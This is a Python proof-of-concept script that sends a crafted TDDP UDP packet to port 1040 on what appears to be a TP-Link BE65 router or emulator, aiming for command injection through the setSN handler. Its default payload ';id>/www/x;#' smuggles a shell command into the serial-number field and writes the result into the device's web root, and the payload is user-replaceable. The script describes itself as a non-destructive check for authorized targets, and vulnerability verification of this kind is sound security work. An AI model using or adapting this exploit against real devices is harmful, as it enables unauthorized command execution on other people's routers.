#!/usr/bin/env python3
import argparse
import hashlib
import socket
import struct


def build_packet(payload: bytes, subtype: int = 0x7A) -> bytes:
    header = struct.pack(
        ">BBBBIHBB",
        2,
        3,
        1,
        0,
        0,
        1,
        subtype,
        0,
    ) + b"\0" * 16
    header = header[:12] + hashlib.md5(header).digest()
    return header + payload


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Non-destructive BE65 TDDP setSN command-injection check"
    )
    parser.add_argument("target", help="Emulator/device IP (use only on an authorized target)")
    parser.add_argument("--port", type=int, default=1040)
    parser.add_argument("--source-port", type=int, default=54321)
    parser.add_argument(
        "--payload",
        default=";id>/www/x;#",
        help="Short shell fragment; the setSN handler copies at most 13 bytes",
    )
    args = parser.parse_args()

    payload = args.payload.encode("ascii") + b"\0"
    if len(payload) > 13:
        parser.error("payload including its NUL terminator must not exceed 13 bytes")

    packet = build_packet(payload)
    print(f"packet={packet.hex()}")

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(("0.0.0.0", args.source_port))
    sock.settimeout(3)
    try:
        sock.sendto(packet, (args.target, args.port))
        data, address = sock.recvfrom(4096)
        print(f"response_from={address[0]}:{address[1]} length={len(data)}")
        print(f"response={data.hex()}")
    except socket.timeout:
        print("response_timeout; check the file/serial side channel instead")
    finally:
        sock.close()


if __name__ == "__main__":
    main()
